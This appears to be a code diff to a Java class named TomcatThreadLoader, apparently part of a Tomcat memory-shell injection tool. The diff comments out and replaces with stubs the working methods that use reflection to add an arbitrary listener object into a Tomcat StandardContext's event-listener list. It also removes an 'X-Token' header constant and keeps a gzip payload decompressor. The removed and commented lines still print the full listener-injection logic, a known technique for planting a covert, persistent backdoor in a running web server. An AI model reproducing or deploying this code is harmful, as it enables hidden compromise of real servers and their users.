@@ -20,7 +20,6 @@ import java.util.zip.GZIPInputStream;
 @Middleware(Middleware.Tomcat)
 public class TomcatThreadLoader {
     private static String gzipObject;
-    private static String HEADER = "X-Token";
     private static Object[] applicationEventListenersObjects;
     private static List applicationEventListeners;
     private static Boolean flag = false;
@@ -70,63 +69,63 @@ public class TomcatThreadLoader {
         }
     }
 
-//    public static boolean isInject(Object standardContext, Object object) {
-//        return false;
-//    }
-//    public static void inject(Object standardContext, Object object) throws Exception {
-//
-//    }
+    public static boolean isInject(Object standardContext, Object object) {
+        return false;
+    }
+    public static void inject(Object standardContext, Object object) throws Exception {
+
+    }
 
     /**
      * Listener
      */
-    public static boolean isInject(Object standardContext, Object object) {
-        try {
-            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
-            for (int i = 0; i < applicationEventListeners.size(); i++) {
-                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
-                    return true;
-                }
-            }
-        } catch (Exception e) {
-
-        }
-
-        try {
-            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
-            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
-                Object applicationEventListenersObject = applicationEventListenersObjects[i];
-                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
-                    Object h = getFieldValue(applicationEventListenersObject, "h");
-                    Object h2 = getFieldValue(object, "h");
-                    if (h.getClass().getName().contains(h2.getClass().getName())) {
-                        return true;
-                    }
-                } else {
-                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
-                        return true;
-                    }
-                }
-            }
-        } catch (Exception e) {
-
-        }
-        return false;
-    }
-
-    public static void inject(Object standardContext, Object object) throws Exception {
-        if (applicationEventListenersObjects != null) {
-            // 5 6
-            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
-            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
-            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
-            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
-        } else {
-            // 7 8 9 10
-            invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
-        }
-        flag = true;
-    }
+//    public static boolean isInject(Object standardContext, Object object) {
+//        try {
+//            applicationEventListeners = (List) getFieldValue(standardContext, "applicationEventListenersList");
+//            for (int i = 0; i < applicationEventListeners.size(); i++) {
+//                if (applicationEventListeners.get(i).getClass().getName().contains(object.getClass().getName())) {
+//                    return true;
+//                }
+//            }
+//        } catch (Exception e) {
+//
+//        }
+//
+//        try {
+//            applicationEventListenersObjects = (Object[]) getFieldValue(standardContext, "applicationEventListenersObjects");
+//            for (int i = 0; i < applicationEventListenersObjects.length; i++) {
+//                Object applicationEventListenersObject = applicationEventListenersObjects[i];
+//                if (applicationEventListenersObject instanceof Proxy && object instanceof Proxy) {
+//                    Object h = getFieldValue(applicationEventListenersObject, "h");
+//                    Object h2 = getFieldValue(object, "h");
+//                    if (h.getClass().getName().contains(h2.getClass().getName())) {
+//                        return true;
+//                    }
+//                } else {
+//                    if (applicationEventListenersObject.getClass().getName().contains(object.getClass().getName())) {
+//                        return true;
+//                    }
+//                }
+//            }
+//        } catch (Exception e) {
+//
+//        }
+//        return false;
+//    }
+//
+//    public static void inject(Object standardContext, Object object) throws Exception {
+//        if (applicationEventListenersObjects != null) {
+//            // 5 6
+//            Object[] newApplicationEventListenersObjects = new Object[applicationEventListenersObjects.length + 1];
+//            System.arraycopy(applicationEventListenersObjects, 0, newApplicationEventListenersObjects, 0, applicationEventListenersObjects.length);
+//            newApplicationEventListenersObjects[newApplicationEventListenersObjects.length - 1] = object;
+//            setFieldValue(standardContext, "applicationEventListenersObjects", newApplicationEventListenersObjects);
+//        } else {
+//            // 7 8 9 10
+//            invokeMethod(standardContext, "addApplicationEventListener", new Class[]{Object.class}, new Object[]{object});
+//        }
+//        flag = true;
+//    }
 
     // tools
     public static byte[] decompress(String gzipObject) throws IOException {
